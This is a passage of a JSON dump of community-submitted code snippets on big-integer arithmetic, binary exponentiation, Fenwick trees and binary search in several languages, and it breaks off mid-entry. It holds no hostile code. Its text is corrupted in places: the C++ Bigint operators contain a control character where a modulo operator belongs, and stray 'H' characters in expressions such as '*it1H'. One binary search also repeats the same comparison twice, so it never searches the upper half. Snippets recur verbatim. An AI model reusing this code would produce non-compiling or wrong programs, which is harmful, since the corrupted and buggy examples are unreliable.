    "description": "const theBiggestInt = 9007199254740991n const alsoHuge = BigInt(9007199254740991) // 9007199254740991n const hugeString = BigInt(\"9007199254740991\") // 9007199254740991n const hugeHex = BigInt(\"0x1fffffffffffff\") // 9007199254740991n const hugeBin = BigInt(\"0b11111111111111111111111111111111111111111111111111111\") // 9007199254740991n\n#include <stdexcept> #include\"Bigint.hpp\" #include<algorithm> // CONSTRUCTOR OVERLOAD  Bigint::Bigint(std::list<unsigned char>B)     :m_digits(B){} Bigint::~Bigint(){} //##################################### is_zero #########>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Amir Ammar bool Bigint::is_zero()const {      if(m_digits.front()=='0'){        return true;      }      return false; } //##################################### is_negative ######################################################### bool Bigint::is_negative() const{    if(m_is_negative == true){      return  true ;    }else       return false; } //<<<<<<<<<<<<<<<<<<<<<<<<<<<insertion operator overloading<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< Amir Ammar std::ostream& operator<<(std::ostream& out, const Bigint& i){   for(auto b = i.m_digits.begin(); b != i.m_digits.end(); ++b){     out<<(*b);   }   return (out); } //>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>extraction operator overloading>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Efi Fogel std::istream& operator>>(std::istream& in, Bigint& i) {   char c;   in.get(c);   if (c == '-') i.m_is_negative = true;   else {     if (! std::isdigit(c)) throw std::runtime_error(\"Invalid input\");     i.m_digits.emplace_front(c);   }   while (in.get(c) && (c != 0xa)) {     if (! std::isdigit(c)) throw std::runtime_error(\"Invalid input\");     i.m_digits.emplace_front(c);   }   i.m_digits.reverse(); // additional method to return the reversed value (the real input)   while(i.m_digits.front()=='0'&&i.m_digits.size()!= 1){ // while loop to earse additional zeroes      i.m_digits.pop_front();     if(i.m_digits.size()== 1)       break;   }   return in; }\nbigint\t-2^63 (-9,223,372,036,854,775,808) to 2^63-1 (9,223,372,036,854,775,807)\t8 Bytes int\t-2^31 (-2,147,483,648) to 2^31-1 (2,147,483,647)\t4 Bytes smallint\t-2^15 (-32,768) to 2^15-1 (32,767)\t2 Bytes tinyint\t0 to 255\t1 Byte\nbigint\t-2^63 (-9,223,372,036,854,775,808) to 2^63-1 (9,223,372,036,854,775,807)\t8 Bytes\n#include\"Bigint.hpp\" #include\"Command.hpp\" #include<string> #include<sstream> #include<iostream> int main() {     try     {       Bigint list1 ;       Bigint list2 ;       std::string userinput;       std::cout<<\"Please enter the first integer: \";  // ===>>> Bigint 1        std::cin >> list1;       std::cout<<\"Please enter the second integer: \";  // ===>>> Bigint 2        std::cin >> list2;       std::cout<<\"Please enter the command (0=+, 1=-, 2=*):\\t\";       std::cin>>userinput;       if(userinput[0]<48||userinput[0]>50||userinput.length()>1)throw std::runtime_error(\"invalid input\");       switch(userinput[0]H)           {             case(ADD):              std::cout<<list1+list2<<std::endl;              break;             case(SUB):              std::cout<<list1-list2<<std::endl;              break;             case(MUL):              std::cout<<list1*list2<<std::endl;              break;           }     }catch(std::runtime_error& e){ std::cout<<e.what()<<std::endl;}   return 0; }\n",
    "reg_date": "2021-10-12T11:37:29.000Z"
  },
  {
    "id": 594,
    "keyword": null,
    "link": null,
    "title": " bigint c++",
    "description": "//Bigint.hpp class #ifndef BIGINT_HPP #define BIGINT_HPP  #define BASE 10  #include <iostream> #include <list> #include\"Command.hpp\" class Bigint { public:   Bigint() = default;  // Construct expect no arg    Bigint(const Bigint&) = default; // Copy constructor    Bigint(Bigint&&) = default; // Move constructor   Bigint& operator=(const Bigint&) = default; // Copy assignment    Bigint& operator=(Bigint&&) = default; // Move assignment    ~Bigint(); // Destructort    Bigint(std::list<unsigned char>B);   // Accessors methods ########################################################################   bool is_zero()const;    bool is_negative() const;    // Friends ####################################################################################   friend Bigint operator+(const Bigint& a, const Bigint& b);   friend Bigint operator-(const Bigint& a, const Bigint& b);   friend Bigint operator*(const Bigint& a, const Bigint& b);    friend std::ostream& operator<<(std::ostream& out, const Bigint& i);   friend std::istream& operator>>(std::istream& in, Bigint& i);   friend Bigint minus_operator_cases(const Bigint& a, const Bigint& b); private:   //! Determine whether the integer is negative.   bool m_is_negative = false;    //! A linked list of digits.   std::list<unsigned char> m_digits; };  Bigint operator+(const Bigint& a, const Bigint& b); Bigint operator-(const Bigint& a, const Bigint& b); Bigint operator*(const Bigint& a, const Bigint& b); std::ostream& operator<<(std::ostream& out, const Bigint& i); std::istream& operator>>(std::istream& in, Bigint& i); #endif \n//bigint.cpp methods implementation #include <stdexcept> #include\"Bigint.hpp\" #include<algorithm> /** //**************************** overloading operator multiplication ******************************************** ********************************         Amir Ammar                 *******************************************/ Bigint operator*(const Bigint& a, const Bigint& b){   Bigint temp1 = a;   Bigint temp2 = b;   Bigint temp3;  // using temp3 object as a temporary to store the chars each iteration    temp3.m_digits ={'0'};   Bigint temp4;  // for the arithmetic operation + between (temp3+temp4) and next temp4 to store the value of temp3    temp4.m_digits = {'0'};   Bigint mult;      // the final values will be stored here and we return mult    mult.m_digits = {'0'};   if(temp1.is_zero()||temp2.is_zero()){return mult.m_digits;}  // if one of them is zero we return mult == '0';   char devide_by_ten{'0'};     // initializing devided by ten variable as a char type   char devide_by_modulo{'0'};  // initializing devided by modulo variable as a char type    int size_of_in {0};          // size of in is a variable that will decide next how many zeroes will be pushed inside temp3 each iteration   if(temp1.m_digits>temp2.m_digits){  // if statement to in     size_of_in = temp2.m_digits.size();// i decided to intilize it according to the size of the bigger Bigint.size()   }else{     size_of_in = temp1.m_digits.size();   }   int push_zeros = size_of_in ; // we need to loop and push zeroes so i need this variable first to have the same value as size_of_in   int counter = 0; // to increment the counter each time a zero is pushed and finally to break the loop    int minus_one = 0; // to decrment the valuee by one each loop   auto iterator1=temp1.m_digits.end();    auto iterator2=temp2.m_digits.end();   // auto iterator1_1=temp1.m_digits.end(); // those variables was a part of experiment that succeeded    // auto iterator2_2=temp2.m_digits.end();  // those variables was a part of experiment that succeeded     while(true)//iterator1_1!=temp1.begin()||iterator2_2!=temp2.begin()   {       temp3.m_digits.clear();                              // cleaning the temp3 each loop so we can store the new value          while(push_zeros+minus_one+counter != size_of_in){ // while loop to push zero for temp3 each iteration           ++counter;           temp3.m_digits.emplace_front('0');         }         --minus_one;         counter =0;         --iterator2;          if(iterator2==temp2.m_digits.end())break;  // break when we finally reached the last iteration              while(iterator1!=temp1.m_digits.begin()){                --iterator1;               devide_by_modulo=((*iterator1-48)*(*iterator2-48)+(devide_by_ten-48))\u0010+'0';               devide_by_ten = ((*iterator1-'0')*(*iterator2-'0')+(devide_by_ten-'0'))/10+'0';               temp3.m_digits.emplace_front(devide_by_modulo);             }             if(devide_by_ten != '0')temp3.m_digits.emplace_front(devide_by_ten);             devide_by_modulo = {'0'};             devide_by_ten ={'0'};     mult = temp3+temp4; // the arithmetic operation between temp3+temp4 stored inside mult      temp4= temp4+temp3;  // the result will be also stored inside temp4 so we can do another + operation but with different values inside temp3     iterator1=temp1.m_digits.end();// initializing the iterator1 as the end so we could loop again with same values      // --iterator2_2; // experiment      // --iterator1_1; // experiment    }   if(a.m_is_negative==true&& b.m_is_negative==true){return mult;} // if both negative we return mult with none negative sign    if(a.m_is_negative==true||b.m_is_negative==true)mult.m_digits.emplace_front('-'); // if one of them is negative we push -    return mult;  // and finally we return mult  }\n// bigint methods implementation #include <stdexcept> #include\"Bigint.hpp\" #include<algorithm> //+++++++++++++++++++++++++++    overloaded pluse operator    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ // ++++++++++++++++++++++++++++        Amir Ammar             +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ Bigint operator+(const Bigint& a, const Bigint& b){   Bigint temp1 = a;   Bigint temp2 = b;   Bigint temp3;   if(temp1.is_zero()&&temp2.is_zero()){temp3.m_digits={'0'};return temp3;}   if(!temp1.is_negative() &&temp2.is_negative()){  // if  (+temp1) (+) (-temp2)  done      temp2.m_is_negative = false;     temp3 = temp1-temp2;     return temp3;   }   if(temp1.is_negative()&&!temp2.is_negative()){ // if  (-temp1) (+)  (+temp2)   done      temp1.m_is_negative = false;     temp3 = temp2-temp1;     return temp3;   }   int carry {0}; int sum{0};auto it1 = temp1.m_digits.rbegin(); auto it2 = temp2.m_digits.rbegin();   while(it1 != temp1.m_digits.rend() && it2 != temp2.m_digits.rend() ){     ((a.m_digits.size()>b.m_digits.size()))?temp2.m_digits.push_front('0'):temp1.m_digits.push_front('0');     sum=((*it1-'0')+(*it2-'0')+carry);     temp3.m_digits.emplace_front(sum\u0010+'0');     carry=sum/10;     ++it1; ++it2;   }   if(carry != 0)temp3.m_digits.emplace_front(carry+'0');   if(temp1.is_negative()&&temp2.is_negative()) // if (-temp1) + (-temp2) done   {      temp3.m_digits.emplace_front('-'); // we push eventually (-)   }   return temp3; } //-------------------------------- overloaded  minus operator ----------------------------------------  //--------------------------------------   Amir Ammar   ---------------------------------------- Bigint operator-(const Bigint& a,const Bigint& b) {    Bigint temp1(a);   Bigint temp2(b);   Bigint sub;   if(temp1.is_zero()&&temp2.is_zero()){sub.m_digits={'0'};return sub;}   if(!temp1.is_negative()&& temp2.is_negative()){  // (+temp1) - (-temp2)       temp2.m_is_negative = false;      return temp1+temp2;       }   if(temp1.is_negative() && !temp2.is_negative()){  // (-temp1) - (+temp2)       temp2.m_is_negative = true;      return temp1+temp2;       }   if(temp1.is_negative()&&temp2.is_negative()){     temp1.m_is_negative = false;     temp2.m_is_negative = false;     return temp2 - temp1 ;   }   auto it_1 = temp1.m_digits.end();    auto it_2 = temp2.m_digits.end();    int one_less{0};   int length = temp1.m_digits.size()-temp2.m_digits.size();   if(length <0){     for(int i = length ; i<0; ++i) //      ((temp1.m_digits.size()>temp2.m_digits.size())?temp2.m_digits.emplace_front('0'):temp1.m_digits.emplace_front('0'));   }else   {     for(int i = length; i>0; --i)       ((temp1.m_digits.size()>temp2.m_digits.size())?temp2.m_digits.emplace_front('0'):temp1.m_digits.emplace_front('0'));   }   auto it1 = temp1.m_digits.end(); auto it2 = temp2.m_digits.end();   while(it1 != temp1.m_digits.begin() && it2 != temp2.m_digits.begin()){       --it1; --it2;        int it1_int = *it1H;       int it2_int = *it2H;     if(it1_int-it2_int-one_less<0){       it1_int+= 10;       sub.m_digits.emplace_front(it1_int-it2_int-one_less+'0');       one_less = 1;     }else{       sub.m_digits.emplace_front(it1_int-it2_int-one_less+'0');       one_less = 0;     }   }   if(one_less==1){     sub=temp2-temp1 ;     sub.m_digits.emplace_front('-');   }   while(sub.m_digits.front()=='0'&&sub.m_digits.size()!= 1){     sub.m_digits.pop_front();     if(sub.m_digits.size()== 1)       break;   }   return sub.m_digits; }\n//bigint.cpp methods implementation #include <stdexcept> #include\"Bigint.hpp\" #include<algorithm> // CONSTRUCTOR OVERLOAD  Bigint::Bigint(std::list<unsigned char>B)     :m_digits(B){} Bigint::~Bigint(){} //##################################### is_zero #########>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Amir Ammar bool Bigint::is_zero()const {      if(m_digits.front()=='0'){        return true;      }      return false; } //##################################### is_negative ######################################################### bool Bigint::is_negative() const{    if(m_is_negative == true){      return  true ;    }else       return false; } //<<<<<<<<<<<<<<<<<<<<<<<<<<<insertion operator overloading<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<< Amir Ammar std::ostream& operator<<(std::ostream& out, const Bigint& i){   for(auto b = i.m_digits.begin(); b != i.m_digits.end(); ++b){     out<<(*b);   }   return (out); } //>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>extraction operator overloading>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Efi Fogel std::istream& operator>>(std::istream& in, Bigint& i) {   char c;   in.get(c);   if (c == '-') i.m_is_negative = true;   else {     if (! std::isdigit(c)) throw std::runtime_error(\"Invalid input\");     i.m_digits.emplace_front(c);   }   while (in.get(c) && (c != 0xa)) {     if (! std::isdigit(c)) throw std::runtime_error(\"Invalid input\");     i.m_digits.emplace_front(c);   }   i.m_digits.reverse(); // additional method to return the reversed value (the real input)   while(i.m_digits.front()=='0'&&i.m_digits.size()!= 1){ // while loop to earse additional zeroes      i.m_digits.pop_front();     if(i.m_digits.size()== 1)       break;   }   return in; }\n //+++++++++++++++++++++++++++    overloaded pluse operator    ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ // ++++++++++++++++++++++++++++        Amir Ammar             +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ Bigint operator+(const Bigint& a, const Bigint& b){   Bigint temp1 = a;   Bigint temp2 = b;   Bigint temp3;   if(temp1.is_zero()&&temp2.is_zero()){temp3.m_digits={'0'};return temp3;}   if(!temp1.is_negative() &&temp2.is_negative()){  // if  (+temp1) (+) (-temp2)  done      temp2.m_is_negative = false;     temp3 = temp1-temp2;     return temp3;   }   if(temp1.is_negative()&&!temp2.is_negative()){ // if  (-temp1) (+)  (+temp2)   done      temp1.m_is_negative = false;     temp3 = temp2-temp1;     return temp3;   }   int carry {0}; int sum{0};auto it1 = temp1.m_digits.rbegin(); auto it2 = temp2.m_digits.rbegin();   while(it1 != temp1.m_digits.rend() && it2 != temp2.m_digits.rend() ){     ((a.m_digits.size()>b.m_digits.size()))?temp2.m_digits.push_front('0'):temp1.m_digits.push_front('0');     sum=((*it1-'0')+(*it2-'0')+carry);     temp3.m_digits.emplace_front(sum\u0010+'0');     carry=sum/10;     ++it1; ++it2;   }   if(carry != 0)temp3.m_digits.emplace_front(carry+'0');   if(temp1.is_negative()&&temp2.is_negative()) // if (-temp1) + (-temp2) done   {      temp3.m_digits.emplace_front('-'); // we push eventually (-)   }   return temp3; } //-------------------------------- overloaded  minus operator ----------------------------------------  //--------------------------------------   Amir Ammar   ---------------------------------------- Bigint operator-(const Bigint& a,const Bigint& b) {    Bigint temp1(a);   Bigint temp2(b);   Bigint sub;   if(temp1.is_zero()&&temp2.is_zero()){sub.m_digits={'0'};return sub;}   if(!temp1.is_negative()&& temp2.is_negative()){  // (+temp1) - (-temp2)       temp2.m_is_negative = false;      return temp1+temp2;       }   if(temp1.is_negative() && !temp2.is_negative()){  // (-temp1) - (+temp2)       temp2.m_is_negative = true;      return temp1+temp2;       }   if(temp1.is_negative()&&temp2.is_negative()){     temp1.m_is_negative = false;     temp2.m_is_negative = false;     return temp2 - temp1 ;   }   auto it_1 = temp1.m_digits.end();    auto it_2 = temp2.m_digits.end();    int one_less{0};   int length = temp1.m_digits.size()-temp2.m_digits.size();   if(length <0){     for(int i = length ; i<0; ++i) //      ((temp1.m_digits.size()>temp2.m_digits.size())?temp2.m_digits.emplace_front('0'):temp1.m_digits.emplace_front('0'));   }else   {     for(int i = length; i>0; --i)       ((temp1.m_digits.size()>temp2.m_digits.size())?temp2.m_digits.emplace_front('0'):temp1.m_digits.emplace_front('0'));   }   auto it1 = temp1.m_digits.end(); auto it2 = temp2.m_digits.end();   while(it1 != temp1.m_digits.begin() && it2 != temp2.m_digits.begin()){       --it1; --it2;        int it1_int = *it1H;       int it2_int = *it2H;     if(it1_int-it2_int-one_less<0){       it1_int+= 10;       sub.m_digits.emplace_front(it1_int-it2_int-one_less+'0');       one_less = 1;     }else{       sub.m_digits.emplace_front(it1_int-it2_int-one_less+'0');       one_less = 0;     }   }   if(one_less==1){     sub=temp2-temp1 ;     sub.m_digits.emplace_front('-');   }   while(sub.m_digits.front()=='0'&&sub.m_digits.size()!= 1){     sub.m_digits.pop_front();     if(sub.m_digits.size()== 1)       break;   }   return sub.m_digits; }\n",
    "reg_date": "2021-10-12T11:37:29.000Z"
  },
  {
    "id": 595,
    "keyword": null,
    "link": null,
    "title": " binary addition using bitwise operators",
    "description": "#include<stdio.h>   int bitwiseadd(int x, int y) {     while (y != 0)     {         int carry = x & y;         x = x ^ y;          y = carry << 1;     }     return x; }   int main() {     int num1, num2;     printf(\"\\nEnter two numbers to perform addition using bitwise operators: \");     scanf(\"%d%d\", &num1, &num2);     printf(\"\\nSum is %d\", bitwiseadd(num1, num2));     return 0; }\n",
    "reg_date": "2021-10-12T11:37:29.000Z"
  },
  {
    "id": 596,
    "keyword": null,
    "link": null,
    "title": " binary algebra cpp",
    "description": "unsigned char a=195; unsigned char b=87; unsigned char c; c=a&b;\n",
    "reg_date": "2021-10-12T11:37:29.000Z"
  },
  {
    "id": 597,
    "keyword": null,
    "link": null,
    "title": " binary exponentiation",
    "description": "#include<bits/stdc++.h> using namespace std; typedef unsigned long long ull; //complexity O(log k) ull po(ull n,ull k){ \tull x=1; \twhile(k){ \t\tif(k&1) \t\t\tx*=n; \t\tn*=n; \t\tk>>=1; \t} \treturn x; } int main(){ \tull n,m;     //n^m \tcin>>n>>m; \tcout<<po(n,m); \treturn 0; }\nlong long binpow(long long a, long long b, long long m) {     a %= m;     long long res = 1;     while (b > 0) {         if (b & 1)             res = res * a % m;         a = a * a % m;         b >>= 1;     }     return res; } \n",
    "reg_date": "2021-10-12T11:37:29.000Z"
  },
  {
    "id": 598,
    "keyword": null,
    "link": null,
    "title": " binary exponentiation modulo m",
    "description": "long long binpow(long long a, long long b, long long m) {     a %= m;     long long res = 1;     while (b > 0) {         if (b & 1)             res = res * a % m;         a = a * a % m;         b >>= 1;     }     return res; } \n",
    "reg_date": "2021-10-12T11:37:29.000Z"
  },
  {
    "id": 599,
    "keyword": null,
    "link": null,
    "title": " binary index tree c++",
    "description": "class bit{ public:     int n;     vector<int> tree;      bit(){};     bit(int _n){         n=_n;         tree.resize(n+1);     };      void update(int idx,int val){         while(idx<=n){             tree[idx]+=val;             idx+=idx&(-idx);         }     };      int read(int idx){         int res=0;         while(idx>0){             res+=tree[idx];             idx-=idx&(-idx);         }         return res;     };      int sum(int L,int R){         return read(R)-read(L-1);     }; };\n",
    "reg_date": "2021-10-12T11:37:29.000Z"
  },
  {
    "id": 600,
    "keyword": null,
    "link": null,
    "title": " binary indexed tree",
    "description": "template<class T> class BIT {      vector<T> bit; public:     BIT (int size) : bit(vector<T>(size+1)) {}     BIT (vector<T>& v) : bit(vector<T>(v.size()+1)) {         for (int i = 0; i<v.size(); ++i) {             update(i, v[i]);         }     }     T sum (int i) {         ++i;         T s = 0;         while (i>0) {             s += bit[i];             i -= i&-i;         }         return s;     }     void update (int i, T u) {         ++i;         while (i<bit.size()) {             bit[i] += u;             i += i&-i;         }     }  };\n// C++ code to demonstrate operations of Binary Index Tree  #include <iostream>     using namespace std;     /*         n --> No. of elements present in input array.       BITree[0..n] --> Array that represents Binary Indexed Tree.      arr[0..n-1] --> Input array for which prefix sum is evaluated. */    // Returns sum of arr[0..index]. This function assumes  // that the array is preprocessed and partial sums of  // array elements are stored in BITree[].  int getSum(int BITree[], int index)  {      int sum = 0; // Iniialize result         // index in BITree[] is 1 more than the index in arr[]      index = index + 1;         // Traverse ancestors of BITree[index]      while (index>0)      {          // Add current element of BITree to sum          sum += BITree[index];             // Move index to parent node in getSum View          index -= index & (-index);      }      return sum;  }     // Updates a node in Binary Index Tree (BITree) at given index  // in BITree. The given value 'val' is added to BITree[i] and   // all of its ancestors in tree.  void updateBIT(int BITree[], int n, int index, int val)  {      // index in BITree[] is 1 more than the index in arr[]      index = index + 1;         // Traverse all ancestors and add 'val'      while (index <= n)      {      // Add 'val' to current node of BI Tree      BITree[index] += val;         // Update index to that of parent in update View      index += index & (-index);      }  }     // Constructs and returns a Binary Indexed Tree for given  // array of size n.  int *constructBITree(int arr[], int n)  {      // Create and initialize BITree[] as 0      int *BITree = new int[n+1];      for (int i=1; i<=n; i++)          BITree[i] = 0;         // Store the actual values in BITree[] using update()      for (int i=0; i<n; i++)          updateBIT(BITree, n, i, arr[i]);         // Uncomment below lines to see contents of BITree[]      //for (int i=1; i<=n; i++)      //     cout << BITree[i] << \" \";         return BITree;  }        // Driver program to test above functions  int main()  {      int freq[] = {2, 1, 1, 3, 2, 3, 4, 5, 6, 7, 8, 9};      int n = sizeof(freq)/sizeof(freq[0]);      int *BITree = constructBITree(freq, n);      cout << \"Sum of elements in arr[0..5] is \"         << getSum(BITree, 5);         // Let use test the update operation      freq[3] += 6;      updateBIT(BITree, n, 3, 6); //Update BIT for above change in arr[]         cout << \"\\nSum of elements in arr[0..5] after update is \"         << getSum(BITree, 5);         return 0;  } \n",
    "reg_date": "2021-10-12T11:37:30.000Z"
  },
  {
    "id": 601,
    "keyword": null,
    "link": null,
    "title": " binary representation   c++",
    "description": "#include <bitset> ...  char a = -58; std::bitset<8> x(a); std::cout << x << '\\n';  short c = -315; std::bitset<16> y(c); std::cout << y << '\\n'; \n",
    "reg_date": "2021-10-12T11:37:30.000Z"
  },
  {
    "id": 602,
    "keyword": null,
    "link": null,
    "title": " binary search",
    "description": "#binary search python def binaryy(ar, ele):     low = 0      high = len(ar)-1     if ele not in ar:         return \"Not Found\"     while low <= high:         mid = (low + high) // 2         if ar[mid] < ele:             low = mid + 1         elif ar[mid] > ele:             high = mid - 1         else:             return mid   ar = [10, 20, 30, 40, 50] ele = 55 print(binaryy(ar, ele))\n#include <bits/stdc++.h> using namespace std;  int main(){     int n;     cin>>n;     vector<int>v(n);     for(int i = 0; i<n; i++){         cin>>v[i];     }     int to_find;     cin>>to_find;     int lo = 0 , hi = n-1 , mid ;     while(hi - lo > 1){         int mid = (hi + lo)/2;         if(v[mid] < to_find){             lo = mid + 1;         }else{             hi = mid;         }     }     if(v[lo] == to_find){         cout<<lo<<endl;     }else if(v[hi] == to_find){         cout<<hi<<endl;     }else{         cout<<\"Not Found\";      }      return 0; }\n import java.util.Scanner;  public class Binarysearch {  \tpublic static void main(String[] args) { \t\tint[] x= {1,2,3,4,5,6,7,8,9,10,16,18,20,21}; \t\tScanner scan=new Scanner(System.in); \t\tSystem.out.println(\"enter the key:\"); \t\tint key=scan.nextInt(); \t\tint flag=0; \t\tint low=0; \t\tint high=x.length-1; \t\tint mid=0; \t\twhile(low<=high) \t\t{ \t\t\tmid=(low+high)/2; \t\t\tif(key<x[mid]) \t\t\t{ \t\t\t\thigh=mid-1; \t\t\t} \t\t\telse if(key>x[mid]) \t\t\t{ \t\t\t\tlow=mid+1; \t\t\t} \t\t\telse if(key==x[mid]) \t\t\t{ \t\t\t\tflag++; \t\t\t\tSystem.out.println(\"found at index:\"+mid); \t\t\t\tbreak; \t\t\t} \t\t} \t\tif(flag==0) \t\t{ \t\t\tSystem.out.println(\"Not found\"); \t\t} \t\t  \t}  } \n//Binary search can apply to sorted data only. //Time complexity of binary search is O(log n ). //It always divide the whole data in parts and compare  a search key to middle element only.   import java.util.*; public class BinarySearch {  \tpublic static void main(String[] args) { \t\t// TODO Auto-generated method stub \t\tScanner sc = new Scanner(System.in); \t\tint[] a = {10,20,50,30,40}; \t\tint key=sc.nextInt(); \t\t \t\tArrays.sort(a);\t\t\t\t\t// An method in java.util.Arrays package to sort an array element. \t\t \t\tint first=0,end=a.length-1,mid=0,flag=0;  \t\twhile(first<=end) \t\t{ \t\t\tmid=(first+end)/2; \t\t\tif(key<a[mid])\t\t\t\t// Move to left part if key is smaller than middle element. \t\t\t{ \t\t\t\tend = mid-1; \t\t\t} \t\t\telse if(key>a[mid])\t\t   // Move to right part if key is greater than middle element. \t\t\t{ \t\t\t\tfirst = mid+1; \t\t\t} \t\t\telse \t\t\t{ \t\t\t\tflag=1; \t\t\t\tbreak; \t\t\t} \t\t} \t\tif(flag==1) \t\t{ \t\t\tSystem.out.println(\"Success! found\"); \t\t} \t\telse \t\t{ \t\t\tSystem.out.println(\"Error! This key (\" + key + \") does not exist in the array\"); \t\t} \t\t \t}  } \n10 101 61 126 217 2876 6127 39162 98126 712687 1000000000100 6127 1 61 200 -10000 1 217 10000 1000000000\nfunction binarySearchRicorsivo(array A, int p, int r, int v)     if p > r       return -1      if v < A[p] or v > A[r]        return -1      q= (p+r)/2      if A[q] == v        return q      else if A[q] > v        return binarySearchRicorsivo(A,p,q-1,v)      else      \ndef binarySearch(arr, k, low, high):        while low <= high:         mid = low + (high - low)//2         if arr[mid] == k:             return mid         elif arr[mid] < k:              low = mid + 1         else:              high = mid - 1     return -1  arr = [1, 3, 5, 7, 9]  k = 5 result = binarySearch(arr, k, 0, len(arr)-1)  if result != -1:      print(\"Element is present at index \" + str(result))  else:      print(\"Not found\") \n//it is using divide and conquer method #include <iostream>  using namespace std; void binarysearch(int arr[],int start,int end,int val) {     if(start<end)     {         int mid=(start+end)/2;         if(arr[mid]==val)         {             cout<<\"value found:\"<<endl;         }         else if(arr[mid]<val)         {             binarysearch(arr,mid+1,end,val);         }         else if(arr[mid]>val)         {             binarysearch(arr,start,mid-1,val);         }     }     else     {         cout<<\"not present:\"<<endl;     } }  int main() {     int n;     cout<<\"enter the size of the array:\"<<endl;     cin>>n;     int arr[n];     cout<<\"enter the elements of the array:\"<<endl;     for(int i=0;i<n;i++)     {         cin>>arr[i];     }     cout<<\"enter the value you want to search:\"<<endl;     int val;     cin>>val;     binarysearch(arr,0,n-1,val);      return 0; } \n",
    "reg_date": "2021-10-12T11:37:30.000Z"
  },
  {
    "id": 603,
    "keyword": null,
    "link": null,
    "title": " binary search algorithm",
    "description": "#include <iostream> using namespace std;  // This program performs a binary search through an array, must be sorted to work int binarySearch(int array[], int size, int value)  {        int first = 0,         // First array element            last = size - 1,       // Last array element            middle,                // Mid point of search            position = -1;         // Position of search value        bool found = false;        // Flag        while (!found && first <= last)      {               middle = (first + last) / 2;     // Calculate mid point               if (array[middle] == value)      // If value is found at mid           \t{                          found = true;                          position = middle;               }               else if (array[middle] > value)  // If value is in lower half                      last = middle - 1;               else                      first = middle + 1;          // If value is in upper half        }        return position; } int main () {     const int size = 5; // size initialization     int array[size] = {1, 2, 3, 4, 5}; // declare array of size 10     int value; // declare value to be searched for     int result; // declare variable that will be returned after binary search      cout << \"What value would you like to search for? \"; // prompt user to enter value     cin >> value;     result = binarySearch(array, size, value);      if (result == -1) // if value isn't found display this message         cout << \"Not found\\n\";     else  // If value is found, displays message         cout << \"Your value is in the array.\\n\";         return 0; }\n// Java implementation of iterative Binary Search  class BinarySearch {  \t// Returns index of x if it is present in arr[],  \t// else return -1  \tint binarySearch(int arr[], int x)  \t{  \t\tint l = 0, r = arr.length - 1;  \t\twhile (l <= r) {  \t\t\tint m = l + (r - l) / 2;   \t\t\t// Check if x is present at mid  \t\t\tif (arr[m] == x)  \t\t\t\treturn m;   \t\t\t// If x greater, ignore left half  \t\t\tif (arr[m] < x)  \t\t\t\tl = m + 1;   \t\t\t// If x is smaller, ignore right half  \t\t\telse \t\t\t\tr = m - 1;  \t\t}   \t\t// if we reach here, then element was  \t\t// not present  \t\treturn -1;  \t}   \t// Driver method to test above  \tpublic static void main(String args[])  \t{  \t\tBinarySearch ob = new BinarySearch();  \t\tint arr[] = { 2, 3, 4, 10, 40 };  \t\tint n = arr.length;  \t\tint x = 10;  \t\tint result = ob.binarySearch(arr, x);  \t\tif (result == -1)  \t\t\tSystem.out.println(\"Element not present\");  \t\telse \t\t\tSystem.out.println(\"Element found at \" \t\t\t\t\t\t\t+ \"index \" + result);  \t}  } \n#include<iostream> using namespace std; int binarySearch(int arr[], int p, int r, int num) {    if (p <= r) {       int mid = (p + r)/2;       if (arr[mid] == num)       return mid ;       if (arr[mid] > num)       return binarySearch(arr, p, mid-1, num);       if (arr[mid] > num)       return binarySearch(arr, mid+1, r, num);    }    return -1; } int main(void) {    int arr[] = {1, 3, 7, 15, 18, 20, 25, 33, 36, 40};    int n = sizeof(arr)/ sizeof(arr[0]);    int num = 33;    int index = binarySearch (arr, 0, n-1, num);    if(index == -1)    cout<< num <<\" is not present in the array\";    else    cout<< num <<\" is present at index \"<< index <<\" in the array\";    return 0; }\n#binary search python def binaryy(ar, ele):     low = 0      high = len(ar)-1     if ele not in ar:         return \"Not Found\"     while low <= high:         mid = (low + high) // 2         if ar[mid] < ele:             low = mid + 1         elif ar[mid] > ele:             high = mid - 1         else:             return mid   ar = [10, 20, 30, 40, 50] ele = 55 print(binaryy(ar, ele))\n#include <bits/stdc++.h> using namespace std;  int main(){     int n;     cin>>n;     vector<int>v(n);     for(int i = 0; i<n; i++){         cin>>v[i];     }     int to_find;     cin>>to_find;     int lo = 0 , hi = n-1 , mid ;     while(hi - lo > 1){         int mid = (hi + lo)/2;         if(v[mid] < to_find){             lo = mid + 1;         }else{             hi = mid;         }     }     if(v[lo] == to_find){         cout<<lo<<endl;     }else if(v[hi] == to_find){         cout<<hi<<endl;     }else{         cout<<\"Not Found\";      }      return 0; }\n#include <bits/stdc++.h>  using namespace std;  int binarySearch(int arr[], int l, int h, int key){     if(l<=h){         int mid = l + (h-l)/2;          if(arr[mid] == key){             return mid;         }          else if(arr[mid] > key){             return binarySearch(arr, l, mid-1, key);         }          else if(arr[mid] < key){             return binarySearch(arr,mid+1, h, key);         }     }             return -1; }  int main(){     int arr[] = {1,2,3,4,5,6,7,8,9,10};     int n = sizeof(arr)/sizeof(arr[0]);     int key = 7;      int result = binarySearch(arr,0,n-1,key);      (result==-1)         ? cout << \"Element is not found in the array\" << endl         : cout << \"Element is found at index \" << result;      return 0;  }\n",
    "reg_date": "2021-10-12T11:37:30.000Z"
  },
  {
    "id": 604,
    "keyword": null,
    "link": null,
    "title": " binary search function in c++",
    "description": "#include <iostream> using namespace std;  // This program performs a binary search through an array, must be sorted to work int binarySearch(int array[], int size, int value)  {        int first = 0,         // First array element            last = size - 1,       // Last array element            middle,                // Mid point of search            position = -1;         // Position of search value        bool found = false;        // Flag        while (!found && first <= last)      {               middle = (first + last) / 2;     // Calculate mid point               if (array[middle] == value)      // If value is found at mid           \t{                          found = true;                          position = middle;               }               else if (array[middle] > value)  // If value is in lower half                      last = middle - 1;               else                      first = middle + 1;          // If value is in upper half        }        return position; } int main () {     const int size = 5; // size initialization     int 